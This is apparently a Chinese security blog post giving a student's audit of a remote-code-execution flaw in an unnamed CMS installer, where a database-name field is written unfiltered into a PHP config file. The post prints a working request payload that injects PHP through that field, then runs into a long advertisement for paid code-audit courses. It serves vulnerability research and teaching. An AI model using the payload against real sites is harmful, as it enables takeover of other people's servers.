#  某CMS最新版本前台RCE审计流程  
原创 学员投稿
                    学员投稿  进击安全   2026-04-08 02:08  
  
# 免责申明本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。  
  
一、前言  
  
    跟着小朋友老师学习了一段时间代码审计，这里将其中审计出来的一个漏洞给小朋友师傅分享出来。  
  
二、漏洞审计&复现  
  
    首先进行环境搭建。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSuMcgZvFLwiatveLksDVcMfQ2Cn0icxdARPBhHyAgex0S0iazyuyico1g0Ns10uHXRNqLKfFrlvvPvfhiaZIZc5iatSR3CBRNAmWU0I/640?wx_fmt=png&from=appmsg "")  
  
可以看到，后台路径其实是admin+四位数字\install\index.php。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Dfrm5V3o6kSSpXmwzKp0mNN5w9lLJrqZgMx44HV0WVS3cyxVriboiausRzncFF73nnKT0Oicek0oDPNeicp2ClSt5F8Tyia5CbmndWwYK94Gj8KU/640?wx_fmt=jpeg "")  
  
同时，我们到\install\step\step5.php看下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kScSU9wmPiaukaMRMTI0Zia0DX1u3ibtqq5w5yKAR0COmickkWRvSsEKyemrXXkXEqY1bib369Ozqd2jPUsS28oL4AjeyyGBm7uJkr0/640?wx_fmt=png&from=appmsg "")  
  
这里请求了重命名安装目录的函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTygBc1j6VNA39tmLDZxqPkBJDs8ibtibFkgzNOCnXIwJ4U7rMFiazwzPrOMRO3hr6y7r7zy1uOptz7eZzrfjib1oTV6ic91hquicIYw/640?wx_fmt=png&from=appmsg "")  
  
createNonceStr函数实现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTayAvZvuAED3AYb0QalibwhHpKdJlzicpEaNBZpEzb6PRDLLaofg2GVleC1DrM7AA37ZChlCdzX4bkrNvbQg1xvV67bjo7Gbkt0/640?wx_fmt=png&from=appmsg "")  
  
可以看到，就是install_xxxx+四位字符(大小写字母/数字)我这里本地是install_xxxsxtlf。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kR6ac8oPvrTicdnFT4V5p8hg1v6dWmcRKKrTdZtAzVkeUYBHtlBF9FnEib0HEFfbnIzR7fdmw3uJnh47n3bS088pFI1q08VYNuHc/640?wx_fmt=png&from=appmsg "")  
  
为什么我们要知道安装目录呢？因为，触发漏洞需要这个目录请看\install\installdb.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQrIyPju1xIcflNABxiaibC11Ad9MnzpRjYLtZxoibdPFMXs3U1oAGasrQJkhE9xDKdjqCkNZdqxSJDMQ3JKcAXLp6DGVtfrAmuuA/640?wx_fmt=png&from=appmsg "")  
  
connDb函数实现。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRWAp9SrgpugU1roicA8NquZYZjIJwJsfiapmiaspWJ5F844af8R48N6VLP6ZR49mdYjnI6XQ5tF59ALpBLdzibEByiaSKmQFwVkRJw/640?wx_fmt=png&from=appmsg "")  
  
发现了吗？可控的mysql服务器设置！这不就可以mysql恶意文件读取了吗，失败了....默认配置是禁用的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kR873nDULAVQeGdA1jxFpoYqDf4qj7kicsTyWr6fItJ5wnBBHefV58DIxg2REa5740tInK0Ric5KxqZDqc4ice7m72x1BveoSia9gc/640?wx_fmt=png&from=appmsg "")  
  
但就真的结束了吗？并没有  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRG87CXo2icumibKVVGHknfLjO24s2SP8xEgb0lWXVD1u6MmcyF9ZaCfkJxJMiaasYGedoic2zgu53m1dM5TicsKLdxFM7n4JJaN3GY/640?wx_fmt=png&from=appmsg "")  
  
在install_data分支，我们传入了一系列参数，然后判断是否能正常连接，就进入了try  
  
set_php_arr函数实现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRvLMDcDziciaEbw4HJyJYuR1MQKb7jDHlVjWJ0xE9tBXiaNiaIOqnQ2Xl6wzqiaicyFPqNGTLYmSZ0icVbvvUlWSGsX3CA7YKDDcY3NI/640?wx_fmt=png&from=appmsg "")  
  
可以看到没有任何的过滤，就写入文件安装完的网站配置是这样的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTrnnOmic1iaxCWTbz1yb16kPmAorCDhJ2Xp4DGdFKspibwQYRicF7N3ULZZZLYvpuJYLe61l6vMogib94iaOoj5W6gJgZKNRErKSsZo/640?wx_fmt=png&from=appmsg "")  
  
所以利用方式很简单，找个正常的数据库连接并写入信息，这里我们最好控制dbname  
  
```
check=install_data&dbhost=127.0.0.1&dbuser=root&dbpwd=root&dbport=3306&dbname=1','a'=>fputs(fopen('1.php','w'),''),'
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQFeOR6sUNicU2RvVAiaibiarQxYkYR7JaS8guXjYYnw7Wiav8ZCrBxr8XIcPakkwJwwJUAYfay6JuID1MIIbgvntSNDcIcJhUGA0Y4/640?wx_fmt=png&from=appmsg "")  
  
数据库名称记得编辑为payload（一定要能够访问到这个web服务，因为要conn连接，访问不到或者信息不正确无法写入文件）  
```
1','a'=>fputs(fopen('1.php','w'),''),'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTarSqX15tcGAf6K04OAsyjWqEAhA0EPMoZVTwAPLKgurF8T3KgIPITdwyrX3SjcSnoCg3u4Dq2HKZuicpATQpIC0fLiarTpXOJM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQicXBcsibjpnbVPO6Okd5xQHQjUQ78kahepvyibwh81aMrNuV8iatO8XibQzrKas1rfDMHD5YXFdia9F0wB3N7jEZx3Ia8w0kxRDicgA/640?wx_fmt=png&from=appmsg "")  
  
**代码审计培训介绍&广告区域**  
  
  
             历经四期培训，终于迎来了代码审计第五期培训，本次培训依旧一次报名一直可听，并且富含前面四期课程均可以听，先来看看之前的培训都有哪些内容，这里我给大家截屏看看。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/HBLcNkZ8PQddO5DZYzH4GcwlsOwEK5cR1A5XZuWXTP3ib3tWpcAtuLUaliasnZQvBmenGd0UNicFQOsJGyIzodicicg/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0 "")  
  
一、往期-第四期课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dJGuszYr5iaRGiaZURAxJAROibCh1sjaZictcbC4iasuuOgCMQSDSwrG5Wfrx2QgfvKx8icDhm0gIia8fN6mThehEK8ww/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=1 "")  
  
###       
  
  
###     我们先来看看上一期课程内容，内容如下，给各位师傅们讲解上一期课程讲解了哪些内容，包括相关的学员出货记录，以及部分课件内容。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=2 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=3 "")  
  
往期-第四期基础课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=4 "")  
  
  
  
  
###   
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTJgMKP2vbzPT7ykYltbibbZIzdiaef3Ym4fptGKibG6u3micdmG6gV1mVBs0NBgEPjSm7qhOia5uHDR2xHoCPzXfiamxOM7L1TMlqeE/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5 "")  
  
此为第四期基础课程，共计授课四十次，此外第四期相较于第三期新增了APP、小程序、WEB逆向，同时主线仍然在代码审计上面，其中基础课程主要目的为：  
  
掌握代码审计思路、完成0-1、能够独立开始审计项目  
。  
  
讲解方向如下：  
  
  
✅ NET代码审计  
✅ APP、小程序、WEB逆向  
  
✅ JAVA代码审计  
  
  
（当然个人认为讲的最好的是JAVA代码审计，而且此次代码审计偏向0-1的实现，更多的是讲解完漏洞原理之后小朋友带着进行实战代码审计，分析各个项目，从理论→实践的演变，当然小朋友们每个课程都是这种方式。）  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7 "")  
  
往期-第四期  
进阶课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=8 "")  
  
  
  
###   
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT1CmsXFjVIKAdTKpJNXTX1G1TBMYrnaONBxrIiaPmZdH9VvIHIrVPiakdzBd90e8wANGfgFPEIOfzz5BNicz2h7UIORn54cRgWO8/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=9 "")  
  
  
    为什么在第四期课程分为了基础课程以及进阶课程，就是因为发现学员大部分都是为了审计而去审计，单一的去使用某一个方法审计漏洞，而不会进行漏洞的组合拳，扩大危害，  
**虽然自己都是实战案例，但是发现学员都是跟着案例当中的漏洞去套用在了自己的源码\项目当中**  
。  
  
所以开启了第四期进阶代码审计课程，课程目的主要为：  
  
  
✅   
深入理解鉴权  
  
✅   
漏洞组合拳扩大危害  
  
✅   
尝试0-1贴合多数学员完成前台RCE出货  
  
  
（本次授课累计20余次，专项针对以上目的，大量分析鉴权&绕过、组合拳利用、前台RCE）  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=10 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=11 "")  
  
往期-第四期-部分学员报喜&课件  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=12 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT9I111pCwD6ywibOk36QDwtQu1ErsrGUo8cwEKpcsonJtVia5Fcib3VPH9KU2oDaPZaKMlZF6esdjibyplLhONYRGRm6vHcCCvCLU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=13 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRBAPW3icA8cicb3MaLvqAJN2H2mtv2C1yGH1ibrxpU10aegQvFJfM84VMic13VJbFfvOvVjm86psWGhn14HWWgsLoUjkWpfkqB0mA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=18 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQOc6CkKHmfQgowQH9GCMlVhbv3AicHBRzS6RhHM8nbSFY5wO6kOBk0TtrPTbuDYIdA4Mib4Lm2l9DYDnEyo0IsEicDVqXYO8JIq4/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=19 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQLQ8gVkBuRoNZhiaOXplhibontI45j7icbzhgUhAD4YN9gJfIdrCiaVzCrdnajZOSv57CibYLuxtAZj1Dob614BJK9V0HlpmKb2wXQ/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=20 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/G4zicxKmtXXhicvpUX9R0fxBOic1XNQdlPRrh27zNXQlQ9UYKWLzvZvPYqu3licIgC4v7j1ArN4vfJjoxp4MgTvFmA/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=25 "")  
  
上下滑动查看更多  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Pu52Sn0jPu0EbVUSia7W7sUxTVicmhGmYTkl23iaZv7FdOTQE7bh7lb3gMR7hqLULFpHDq5UyDClYpOMAgnLljB2w/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=26 "")  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQtCurUQYOm2BI1SHutCUCutTB3mcjQ9kWfrJibumgTXYjmJquZp5SoejF0IreWE8ITgW9vg9TmAd1RpFdDJfYYulADpicw1Wuhc/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=27 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRwXcFbkztvgDQsbwsNbq4LrNaibKt2ue4Yu5ebWz1j3KEmfPwggSVjOTLI8BAITgphHKb1SJIicUwzRJsiacAV2EyicRiaAAzY11YU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=28 "")  
  
  
  
  
  
  
  
  
  
**左右滑动查看更多**  
  
**>**  
  
    那么可能会有师傅提问，为什么没有PHP呢，其实PHP也是有讲解的，只不过大部分是直接的案例，基础的PHP代码审计函数以及基础等，均放在了第三期课程当中。  
  
（部分课件）  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRBaiaqF8WjrSdX0iaGbKerb6LibCXFgNzhFh5INlcEN9cNiavWeAiaTeK6ezJJnjTBoplMVUBPv6opZRBM5j35dib3ZFqVRa21GoKsE/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=45 "")  
  
    这也是为什么有的学员在报名之后，我会给他规划学习路线，先看xxx在看xxx，这些都是小朋友认为哪一期的那些内容讲的不错，然后给兄弟们总结出来的优质学习路线。  
  
那么接下来我们可以看看小朋友在做了四期培训之后  
学员出货报喜时刻：  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=46 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=47 "")  
  
往期-学员报喜时刻（部分）  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=48 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTWghKPU8RCEUglFN02tZp9tic3cc4Sj6W4g5VIiaGSIIyqWXe1U3jz7vsjEe4TJUMZ7Rw7GZiaiautO737t051OiaWse5yWV61EjN8/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=49 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kS16oaKaZ2Pt2icTpRA8Sg6rIic5Evt3YAo5SMkKqCV83tfIickUSV0907nW8qVv1d1aWmKCLQUu7icSKpoIzxBcAJg8q49W8WCd2Q/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=50 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTgajJN76oqHkDiaWNVUQ6zWUNNibHR0DzxWFtmmrU546qkJX0xM882P56KeUKc0ILLQJib6b9cqAf0UhNvicnXgRbDLfTLH0czqxU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=51 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQ6hTKtnsgerTEGKGQib0ThOzZVgvNOZO1ibDZibOpuxWpcjXgicBlOymRhYqgm1sIZ2Za5CRx7X3bf64DdhUHcDicYwNzQVeKD0SvI/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=52 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTFwHyBoyuWmuLYKNV6j1MlKwjDCpeDgaeanLeW2IHXdZw2QibSAvDfYhibuEKUxGSzaUsVibYVLgrR6kHEiaS2y6LufUAFLK4pX8k/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=53 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTibG4tXbph8GhCXXw2UKKdlzDcKwgxPhA93RKbwibzRrJ0kJH0KjIGwtsNiagQPT7UAEHA4o2oMCpKiaFPdyb0AcZqOicDPkr2v6wM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=54 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT2o0TW19ibaBxOn5UqIVzfjHpxP09py1xTCNia3K8Eax2e4cfI7k5ghYAicgBMicZqNL6rgwLeexS3ziaxEyviaIuLu9YLGUexQnQLc/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=55 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSLv1HObQ8tIv9CZ0ORiaHCKLRtvqsBrE9Y7NoPQzUryIkdEiasJ6waX7H2Z61SRjof21DxOu0z67Pu8QrIhZ4iaSsBJWzyOVCwLg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=56 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kS28KtztV0TWNCDM0XAad1vhPztOrcaBibyuvtAsL7NVAcg4AllSqvdE77SXZ4hI23keDCJIJaQX1VRgjhsbBfn6r8YFarKYO7E/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=57 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kS7T1NLMRlvm2yIG8bGIWWQu2IN50l1DBSJ2KeE3w9Nsq6axoXAE63f8UY5rLvLYAkvGU6Pz8VEYtUEiadpibuo7yuteodZm4DcU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=58 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTSH7IbmzRaeSwK7NBLquEj37Sv4xITrE2yibE3s0oql0wn7gN0picKszBresODUMTMEnzytZUMYE1XibkumX6caJw3ce2mceeSfU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=59 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT3j5ogWvcmU3icydYHz7EGAWry9NPy6gtxN5TFReXLtLZAgibKlSycODgib0HEwC2CRWWQBaB3X3VI4w4m01RVjUbr9CV3sLldicw/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=60 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Dfrm5V3o6kQNuxMdj3SEfJd7ESaG8tcf3LGKe72OFEVTESibOuejLv084UDJickZer8Ln57iaU6QQuxFPob0uJiclnhlibZXM3Tt8TRTGyfUMfSM/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=61 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRBX1DYibSolqqXkSXKOCyQatGu1o3YJfZvnBd48hXYvpyBsHjzPIG9xCJia9pHvbNibuAbiaTLoUne14Dibp1LM0BBvNIibtQRt11ibg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=62 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kT0AhBLF0kqd39iaOKkmtxQHyd74JLtMC2Wl1hBIQiaXsic4c4qccXs1wqZd8wsrhM8OF03ACkibZ3aTiaEIDLcicc3KgI2aOmbMRBQs/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=63 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Dfrm5V3o6kSN0KJCic9zGPsN4HmriaJ6wUuuuaWicGqSzJ9zoWhRJzNFViaQw3cBWUyMH1uzKdoPUeyucm2yqcrxcQ7KGge3icDkWBiblNzLhQ5xs/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=64 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTGrvpPrJz4VriamIbKnldibpSIEjdmQbfAgpNlMWFWQADQeTXfHThPzrKvfmv0ia5xGpoZkUJSflDT5Okb61Ifzlss7dbib3H4BQM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=65 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSEBia8eYPmdN08MxasP78ib5punibS8HHN5fbCv0rpQxDYO5YI86sPHOgUylB8icTKgs1MjiaeKfEBwiaf1eNlCS06BgxkdMQo6R5Rw/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=66 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSs7AcF2pWIDsB2rQ8kSnNTCAkcwDpXVfYffyMQxYTiaZTF2uIGJouu76YUhibGQUYsU109Y1QTtjt8wrglQw3SaGnxME1c3gg2c/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=67 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSbBjjXfZhxpCOdTQk5sKIQyBhJAPj6Kz4Dc2H2ibohnfabN5mMhLUDfKQwjaqntovzicN1suUZ5ncmRoDR0l0o9L9iaAbsCMmxicE/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=68 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQxZNlDaMgY6zh8eKTPDTEiblVW8GGtebr0iaaPwPrYx924icmID6vbIjRres3a1iaEicRjU82C4dS161alr6un8fvCNiaqm4CTH5diaQ/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=69 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTvCqu6RpBPyCnGKMPo0LpKcIcA181EoSJrfib0ed9GluXRKmkJ3tYDPasKlFc6sYaKb0pPA1D8VPy1yxfly6q9fIMeXekVIIJU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=70 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRQkgtQiaxia3eY7bFNgxO0oQRRMmNg4aRLRmR7FNs3hqyZz0Gibg8o4K6TshXCSdapJXAdMn98kzkOrLpq3RueU9nV7V26mK7TPs/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=71 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTeUbeJMfPTzKiaoCVpgBOmvMBH5zYf4OHsoQlIDbqnSsd3Q1vmTHAnMeEaWa59QIMFIibEANxGc7icib4dkUibpibrjSicKKtP0eNvVA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=72 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSoF5tEyL9VG8HYNEfey7cVRMKzx0KC0LuWvy6BnvjEXhe46TsQ2DoKfEzX7FA9ibcOAqcAOr1pzwHGbjzM5kMTCRI2oDpKZ1mY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=73 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQ8rKXQzUYZTeQ6CkCeY4LP2pIFwzcyDf0LTxXIz4PmxwFbyADXOianHn9kY4s9O4muv5CAvBRHHMjNq3ibCG7hl5Ws2oNyYdBq4/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=74 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRnDvc1WOtJCwdxIyKfSmdHsEso0ibkzjb8lg0s5vAhZmveptGhnHLy91rc8Dq9GfGhogDMfIGkH1p0qVMSlucbib159k5gdJoPo/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=75 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSrqutX9a4cwjqKcMYWN94OxmbuqroF3FyW8mGaxEZaTZ7eos856rFgEGDoWSicFEG01GVicDobFa70dx7hPfY0Vy3DxOsRmtIkk/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=76 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRjMuaL6JzS7iaQHoyoN08iabK5wn2kG8xVMzib4EkeTtqLaltjmkhkDcorY2a9fm8ftuOxGCJahTYdUQGpxIGoXMPEtL4XBtrFicI/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=77 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTGZXicSNphb5QuFO2Xv3mh9MjJ5YViaupeIBy3d9EYd5IeOlcGBibMVicm3AGThTdKLu200cX6VYDSh4LMlT7GTEmdwjbTeicw5pqg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=78 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRRQBqrTKKFp9pAmx51BrOic2KU2yTYZic9Z692fL8jXzHRLRYK4iaMH9OSGjKEfeCOvxnqwnibfGicQ62wWRoRPibU41AayIzrzBHcM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=79 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQcf7Q4WOZvTOOXDruR5fXX0rJ7z3jIVYw4dedbJK65o7qqD54fRU6wZ7R8wCUPqOvd0IwVibNQ02dshgKtKuibtVorBsn84A8KM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=80 "")  
  
  
  
